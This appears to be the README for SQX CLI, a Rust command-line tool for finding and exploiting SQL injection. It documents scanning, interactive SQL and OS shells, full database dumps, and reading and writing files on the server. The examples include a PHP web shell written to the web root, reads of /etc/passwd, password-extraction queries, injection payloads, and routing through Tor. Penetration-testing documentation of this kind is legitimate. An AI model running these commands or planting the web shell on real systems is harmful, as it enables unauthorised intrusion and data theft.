# SQX CLI

> **Command-line interface for SQX Core.**

The SQX CLI provides a comprehensive command-line interface for SQL injection detection and exploitation. It exposes all features of SQX Core through an intuitive command structure.

## Installation

### From Source

```bash
git clone https://github.com/fatuvirgil/sqx.git
cd sqx
cargo build --release --bin sqx

# Binary is at: target/release/sqx
```

### Prerequisites

- Rust 1.75+
- For AI features: Ollama (optional, for local LLM)

## Quick Reference

```bash
# Basic scan
sqx scan "http://target.com/page.php?id=1"

# Smart scan with tamper
sqx scan "http://target.com/page.php?id=1" --smart --tamper space_to_comment,randomcase

# POST request scan
sqx post "http://target.com/login" --body "user=admin&pass=test'" --ct form

# Full auto scan with crawling
sqx auto "http://target.com/" --smart --max-pages 50

# Interactive SQL shell
sqx sql-shell "http://target.com/page.php?id=1" --param id --dbms mysql

# Interactive OS shell
sqx os-shell "http://target.com/page.php?id=1" --param id --dbms mysql

# Extract full database
sqx dump "http://target.com/page.php?id=1" --param id --dbms mysql
```

## Commands

### `scan` — Scan GET URL

Scan a URL with query parameters for SQL injection.

```bash
sqx scan [OPTIONS] <URL>

Options:
      --smart                   Use smart scan (fingerprinting first)
      --tech <TECH>             Techniques: error,blind,union,time,stacked,oob
      --tamper <TAMPER>         Tamper scripts (comma-separated)
      --oob                     Enable OOB detection (Pro feature)
      --delay <DELAY>           Request delay in ms [default: 100]
      --timeout <TIMEOUT>       Request timeout in seconds [default: 30]
      --output <OUTPUT>         Output: text, json, sarif [default: text]
  -o, --out-file <FILE>         Write output to file
      --param-wordlist <FILE>   Custom parameter names for fuzzing
      --ai-advisor              Enable AI payload suggestions
      --ai-model <MODEL>        Model: ollama:llama3.2, claude:claude-xxx, openai:gpt-4o
      --ai-api-key <KEY>        API key for cloud AI
      --ai-consent              Consent to send data to commercial AI
      
Global Options:
  -v, --verbose                 Verbosity (-v, -vv, -vvv)
      --proxy <URL>             HTTP/SOCKS5 proxy
      --cookie <STR>            Cookie string
      --cookie-auto-detect      Auto-detect cookies
      --login-url <URL>         Login URL for auth
      --auth-method <METHOD>    Auth: form, json, basic, bearer
      --auth-cred <K=V>         Credentials (repeatable)
      --auth-user <USER>        Basic auth username
      --auth-pass <PASS>        Basic auth password
      --auth-token <TOKEN>      Bearer token
      --auth-success <IND>      Success indicator (status/cookie)
```

**Examples:**

```bash
# Basic scan
sqx scan "http://target.com/page.php?id=1"

# Smart scan with specific techniques
sqx scan "http://target.com/page.php?id=1" --smart --tech error,blind

# With tamper chain
sqx scan "http://target.com/page.php?id=1" --tamper space_to_comment,randomcase

# With authentication
sqx scan "http://target.com/page.php?id=1" \
  --cookie "PHPSESSID=abc123" \
  --login-url "http://target.com/login" \
  --auth-method form \
  --auth-cred username=admin \
  --auth-cred password=secret

# With AI assistance (local Ollama)
sqx scan "http://target.com/page.php?id=1" --smart --ai-advisor

# With Claude (requires API key and consent)
sqx scan "http://target.com/page.php?id=1" --smart --ai-advisor \
  --ai-model claude:claude-sonnet-4-5 \
  --ai-api-key $ANTHROPIC_API_KEY \
  --ai-consent

# JSON output to file
sqx scan "http://target.com/page.php?id=1" --output json --out-file results.json

# SARIF for GitHub Advanced Security
sqx scan "http://target.com/page.php?id=1" --output sarif --out-file results.sarif
```

### `post` — Scan POST Endpoint

Scan a POST endpoint with body parameters.

```bash
sqx post [OPTIONS] <URL>

Options:
      --body <BODY>       POST body
      --ct <TYPE>         Content-Type: form, json, xml [default: form]
      --tech <TECH>       Techniques (same as scan)
      --tamper <TAMPER>   Tamper scripts
      --output <OUTPUT>   Output format
  -o, --out-file <FILE>   Output file
```

**Examples:**

```bash
# Form data
sqx post "http://target.com/login" \
  --body "username=admin&password=test'" \
  --ct form

# JSON
sqx post "http://target.com/api/login" \
  --body '{"user":"admin","pass":"test\'"}' \
  --ct json
```

### `auto` — Full Auto Scan

Crawl the target, discover injection points, and scan them all.

```bash
sqx auto [OPTIONS] <URL>

Options:
      --smart                   Use smart scan per injection point
      --max-pages <N>           Max pages to crawl [default: 50]
      --max-depth <N>           Max crawl depth [default: 3]
      --oob                     Enable OOB (Pro feature)
      --ai-advisor              Enable AI
      --ai-model <MODEL>        AI model spec
      --output <OUTPUT>         Output format
      --headless                Use headless browser (Pro feature)
      --chrome-path <PATH>      Chrome binary path
      --render-wait <MS>        JS render wait time [default: 2000]
```

**Examples:**

```bash
# Basic auto scan
sqx auto "http://target.com/"

# With smart scan and more pages
sqx auto "http://target.com/" --smart --max-pages 100 --max-depth 5

# With AI assistance
sqx auto "http://target.com/" --smart --ai-advisor
```

**Note:** `--headless` requires SQX Pro (Chrome-based SPA crawling).

### `sql-shell` — Interactive SQL Shell

Open an interactive SQL shell via blind injection.

```bash
sqx sql-shell [OPTIONS] <URL>

Options:
      --param <PARAM>       Injectable parameter name
      --value <VALUE>       Benign parameter value [default: 1]
      --dbms <DBMS>         Database: mysql, postgresql, mssql, oracle, sqlite
      --technique <TECH>    Extraction: boolean, time [default: boolean]
      --max-length <N>      Max output length [default: 4096]
      --delay <DELAY>       Request delay [default: 100]
```

**Meta-commands:**
- `.tables` — List tables
- `.schema <table>` — Show column names
- `.databases` — List databases
- `.dump <table>` — Extract all rows
- `.quit` or `.exit` — Exit shell

**Examples:**

```bash
# Start SQL shell
sqx sql-shell "http://target.com/page.php?id=1" --param id --dbms mysql

# Inside shell:
SQL> SELECT version()
SQL> .tables
SQL> .schema users
SQL> SELECT * FROM users LIMIT 5
SQL> .dump products
SQL> .quit
```

### `os-shell` — Interactive OS Shell

Open an interactive OS command shell via SQL injection.

```bash
sqx os-shell [OPTIONS] <URL>

Options:
      --param <PARAM>       Injectable parameter name
      --value <VALUE>       Benign parameter value [default: 1]
      --dbms <DBMS>         Database type
      --technique <TECH>    Extraction: boolean, time [default: boolean]
      --max-length <N>      Max output length [default: 4096]
      --delay <DELAY>       Request delay [default: 100]
```

**Examples:**

```bash
sqx os-shell "http://target.com/page.php?id=1" --param id --dbms mysql

# Inside shell:
OS> whoami
OS> uname -a
OS> ls -la /var/www/
OS> cat /etc/passwd
OS> exit
```

### `dump` — Full Database Extraction

Extract the entire database schema and data.

```bash
sqx dump [OPTIONS] <URL>

Options:
      --param <PARAM>       Injectable parameter
      --value <VALUE>       Benign value [default: 1]
      --dbms <DBMS>         Database type [default: mysql]
      --technique <TECH>    Extraction: boolean, time [default: boolean]
      --max-rows <N>        Max rows per table [default: 100]
      --delay <DELAY>       Request delay [default: 100]
      --output <OUTPUT>     Output: text, json, csv
  -o, --out-file <FILE>     Output file
```

**Examples:**

```bash
# Extract database
sqx dump "http://target.com/page.php?id=1" --param id --dbms mysql

# With specific technique
sqx dump "http://target.com/page.php?id=1" --param id --technique time --delay 500

# Output to file
sqx dump "http://target.com/page.php?id=1" --param id --output csv --out-file dump.csv
```

### `file-read` — Read Remote Files

Read a file from the server via SQL injection.

```bash
sqx file-read [OPTIONS] <URL>

Options:
      --param <PARAM>       Injectable parameter
      --file <PATH>         Remote file path to read
      --dbms <DBMS>         Database type [default: mysql]
      --value <VALUE>       Benign value [default: 1]
  -o, --out-file <FILE>     Save to file
```

**Examples:**

```bash
# Read /etc/passwd
sqx file-read "http://target.com/page.php?id=1" --param id --file "/etc/passwd"

# Save to file
sqx file-read "http://target.com/page.php?id=1" --param id --file "/etc/passwd" -o passwd.txt
```

### `file-write` — Write Remote Files

Write content to a file on the server.

```bash
sqx file-write [OPTIONS] <URL>

Options:
      --param <PARAM>       Injectable parameter
      --file <PATH>         Remote file path to write
      --content <CONTENT>   Content to write
      --dbms <DBMS>         Database type [default: mysql]
      --value <VALUE>       Benign value [default: 1]
```

**Examples:**

```bash
# Write web shell
sqx file-write "http://target.com/page.php?id=1" \
  --param id \
  --file "/var/www/html/shell.php" \
  --content '<?php system($_GET["cmd"]); ?>'
```

### `sql` — Execute Custom SQL

Execute a specific SQL query via blind extraction.

```bash
sqx sql [OPTIONS] <URL>

Options:
      --param <PARAM>       Injectable parameter
      --query <QUERY>       SQL query to execute
      --value <VALUE>       Benign value [default: 1]
      --dbms <DBMS>         Database type [default: mysql]
      --technique <TECH>    Extraction: boolean, time [default: boolean]
      --max-length <N>      Max output length [default: 256]
      --output <OUTPUT>     Output format
```

**Examples:**

```bash
# Single query
sqx sql "http://target.com/page.php?id=1" --param id --query "SELECT user()"

# With technique
sqx sql "http://target.com/page.php?id=1" --param id --query "SELECT password FROM users LIMIT 1" --technique time
```

### `tampers` — List Tamper Scripts

```bash
sqx tampers
```

Output:
```
Available tamper scripts:
  urlencode
  double_urlencode
  base64_encode
  space_to_comment
  space_to_tab
  randomcase
  ... (69 total)
```

### `validate` — Validate SQL Payload

Check if a SQL payload is syntactically and semantically valid.

```bash
sqx validate [OPTIONS] <PAYLOAD>

Options:
      --dialect <D>     Target dialect: mysql, postgres, mssql, sqlite, oracle [default: mysql]
      --check-technique Check against known SQLi patterns
```

**Examples:**

```bash
sqx validate "' OR 1=1 --" --dialect mysql
sqx validate "admin' UNION SELECT * FROM users --" --dialect mysql --check-technique
```

### `intel` — Target Intelligence

Collect intelligence about a target domain.

```bash
sqx intel [OPTIONS] <DOMAIN>

Options:
      --output <OUTPUT>     Output format
  -o, --out-file <FILE>     Output file
      --kb-path <PATH>      Knowledge base path [default: ./data/intel.kb]
```

**Examples:**

```bash
sqx intel example.com
sqx intel example.com --output json -o intel.json
```

Collects:
- CVEs affecting the target
- Shodan banners
- GitHub mentions
- Security advisories

### `replay` — Replay HTTP Request

Replay a request from a file or raw HTTP format.

```bash
sqx replay [OPTIONS] <FILE>

Options:
      --output <OUTPUT>     Output format
  -o, --out-file <FILE>     Output file
      --timeout <SECS>      Timeout [default: 30]
```

**Examples:**

```bash
# From file
sqx replay request.txt

# From stdin
cat request.txt | sqx replay -
```

### `bench` — Benchmark

Run benchmark against test targets (requires sqli-labs or similar).

```bash
sqx bench [OPTIONS]

Options:
      --target <URL>    Test target base URL [default: http://localhost:8080]
  -o, --out-file <FILE> JSON results output
```

### `update-payloads` — Update Payload Database

Download and cache additional payloads from sqlmap (GPLv2) and PayloadsAllTheThings (MIT).

```bash
sqx update-payloads
```

## Global Options

These options work with all commands:

```
  -v, --verbose...              Increase verbosity (-v, -vv, -vvv)
      --proxy <URL>             HTTP/SOCKS5 proxy
      --cookie <STR>            Cookie string
      --cookie-auto-detect      Auto-detect cookies
      --login-url <URL>         Login URL
      --auth-method <METHOD>    Auth method
      --auth-cred <K=V>         Credentials
      --auth-user <USER>        Basic auth username
      --auth-pass <PASS>        Basic auth password
      --auth-token <TOKEN>      Bearer token
      --auth-success <IND>      Success indicator
```

## Examples

### Complete Workflow

```bash
# 1. Initial scan
sqx scan "http://target.com/page.php?id=1" --smart --output json -o initial.json

# 2. If vulnerable, start SQL shell
sqx sql-shell "http://target.com/page.php?id=1" --param id --dbms mysql

# 3. Enumerate and dump
sqx dump "http://target.com/page.php?id=1" --param id --dbms mysql -o dump.json

# 4. Try OS command execution
sqx os-shell "http://target.com/page.php?id=1" --param id --dbms mysql
```

### Authentication Flow

```bash
# Form-based login
sqx scan "http://target.com/dashboard?id=1" \
  --login-url "http://target.com/login" \
  --auth-method form \
  --auth-cred username=admin \
  --auth-cred password=secret \
  --auth-success "dashboard" \
  --cookie-auto-detect

# Bearer token
sqx scan "http://api.target.com/users?id=1" \
  --auth-token "eyJhbGciOiJIUzI1NiIs..."
```

### With Proxy

```bash
# Through Burp Suite
sqx scan "http://target.com/?id=1" --proxy http://127.0.0.1:8080

# Through Tor
sqx scan "http://target.com/?id=1" --proxy socks5://127.0.0.1:9050
```

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success / No SQL injection found |
| 1 | Error / Vulnerabilities found (with --fail-on-vuln) |

## License

Dual-licensed under MIT and Apache-2.0.
